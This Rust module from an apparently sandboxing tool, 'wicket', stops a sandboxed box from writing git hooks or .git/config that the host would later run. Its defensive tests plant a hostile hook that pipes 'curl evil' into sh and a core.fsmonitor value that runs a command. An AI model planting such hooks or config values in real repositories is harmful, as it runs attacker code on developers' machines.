//! A workspace's git hooks and config stay the host's (#366). Host git runs a repository's
//! `.git/hooks` and obeys its `.git/config` (`core.fsmonitor`, `core.hooksPath`, filters, aliases),
//! so a box that could write them into a directory of the operator's would run code on the host the
//! next time the operator runs git there. wicket itself never runs git on the host; these keep the
//! operator's own git from running what a box wrote:
//!
//! - an in-place workspace mounted on this host ([`binds`]): its `.git/hooks` and `.git/config` are
//!   mounted read-only over the read-write workspace;
//! - one fetched back from another node ([`keep_host_git`]): the host's `.git/hooks` and
//!   `.git/config` replace whatever the box sent back before it is synced in.
//!
//! Only the workspace's top-level `.git` directory is covered: a repository the box creates or
//! rewrites elsewhere in it (another `.git`, a worktree's `.git` file) is still the box's, untrusted.

use anyhow::{bail, Result};
use std::path::Path;

fn is_dir(p: &Path) -> bool {
    std::fs::symlink_metadata(p).is_ok_and(|m| m.is_dir())
}

fn is_file(p: &Path) -> bool {
    std::fs::symlink_metadata(p).is_ok_and(|m| m.is_file())
}

/// The read-only binds that keep `host_dir`'s `.git/hooks` and `.git/config` the host's, for a
/// workspace mounted on `target` in the box: none if it isn't a repository (a `.git` directory,
/// not a link). An empty hooks directory is made, so there is one to mount over.
pub fn binds(host_dir: &Path, target: &str) -> Result<Vec<(String, String, bool)>> {
    let git = host_dir.join(".git");
    if !is_dir(&git) {
        return Ok(vec![]);
    }
    let mut v = vec![];
    let hooks = git.join("hooks");
    if !is_dir(&hooks) {
        if std::fs::symlink_metadata(&hooks).is_ok() {
            bail!("{} is not a directory: wicket can't keep its hooks the host's", hooks.display());
        }
        std::fs::create_dir(&hooks)?;
    }
    v.push((hooks.display().to_string(), format!("{target}/.git/hooks"), true));
    let config = git.join("config");
    if is_file(&config) {
        v.push((config.display().to_string(), format!("{target}/.git/config"), true));
    }
    Ok(v)
}

/// Before a workspace fetched back from another node replaces `host_dir`'s, makes its `.git/hooks`
/// and `.git/config` (in `staged`) the host's own. A box that replaced the repository's `.git`
/// directory with something else is refused: nothing is synced, and the node keeps its copy.
pub fn keep_host_git(host_dir: &Path, staged: &Path) -> Result<()> {
    let (git, sgit) = (host_dir.join(".git"), staged.join(".git"));
    if !is_dir(&git) {
        return Ok(());
    }
    if !is_dir(&sgit) {
        bail!(
            "the box replaced the workspace's .git directory with {}: nothing here was replaced (the node keeps its copy)",
            if std::fs::symlink_metadata(&sgit).is_ok() { "something else" } else { "nothing" }
        );
    }
    let (hooks, shooks) = (git.join("hooks"), sgit.join("hooks"));
    if is_dir(&hooks) {
        crate::hibernate::sync_dir(&hooks, &shooks, &[])?;
    } else {
        remove(&shooks)?;
    }
    let (config, sconfig) = (git.join("config"), sgit.join("config"));
    remove(&sconfig)?;
    if is_file(&config) {
        std::fs::copy(&config, &sconfig)?;
    }
    Ok(())
}

fn remove(p: &Path) -> Result<()> {
    match std::fs::symlink_metadata(p) {
        Ok(m) if m.is_dir() => std::fs::remove_dir_all(p)?,
        Ok(_) => std::fs::remove_file(p)?,
        Err(_) => {}
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("wicket-gitguard-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn an_in_place_repository_gets_read_only_hooks_and_config() {
        let d = tmp("binds");
        assert!(binds(&d, "/workspace").unwrap().is_empty(), "not a repository");
        std::fs::create_dir_all(d.join(".git")).unwrap();
        std::fs::write(d.join(".git/config"), "[core]\n").unwrap();
        let b = binds(&d, "/workspace").unwrap();
        assert!(d.join(".git/hooks").is_dir(), "made, to mount over");
        assert_eq!(
            b,
            [
                (d.join(".git/hooks").display().to_string(), "/workspace/.git/hooks".to_string(), true),
                (d.join(".git/config").display().to_string(), "/workspace/.git/config".to_string(), true),
            ]
        );
        let _ = std::fs::remove_dir_all(d);
    }

    #[test]
    fn a_fetched_workspace_keeps_the_hosts_hooks_and_config() {
        let (host, staged) = (tmp("host"), tmp("staged"));
        std::fs::create_dir_all(host.join(".git/hooks")).unwrap();
        std::fs::write(host.join(".git/hooks/pre-commit.sample"), "ours").unwrap();
        std::fs::write(host.join(".git/config"), "[core]\n\tbare = false\n").unwrap();
        std::fs::create_dir_all(staged.join(".git/hooks")).unwrap();
        std::fs::write(staged.join(".git/hooks/post-checkout"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        std::fs::write(staged.join(".git/config"), "[core]\n\tfsmonitor = touch /tmp/pwned\n").unwrap();
        std::fs::write(staged.join(".git/HEAD"), "ref: refs/heads/work\n").unwrap();
        keep_host_git(&host, &staged).unwrap();
        assert!(!staged.join(".git/hooks/post-checkout").exists(), "the box's hook is gone");
        assert_eq!(std::fs::read_to_string(staged.join(".git/hooks/pre-commit.sample")).unwrap(), "ours");
        assert_eq!(std::fs::read_to_string(staged.join(".git/config")).unwrap(), "[core]\n\tbare = false\n");
        assert_eq!(std::fs::read_to_string(staged.join(".git/HEAD")).unwrap(), "ref: refs/heads/work\n", "the rest is the box's");
        // A .git replaced by a link is refused outright.
        std::fs::remove_dir_all(staged.join(".git")).unwrap();
        std::os::unix::fs::symlink("elsewhere", staged.join(".git")).unwrap();
        assert!(keep_host_git(&host, &staged).unwrap_err().to_string().contains("replaced the workspace's .git"));
        let _ = std::fs::remove_dir_all(host);
        let _ = std::fs::remove_dir_all(staged);
    }
}
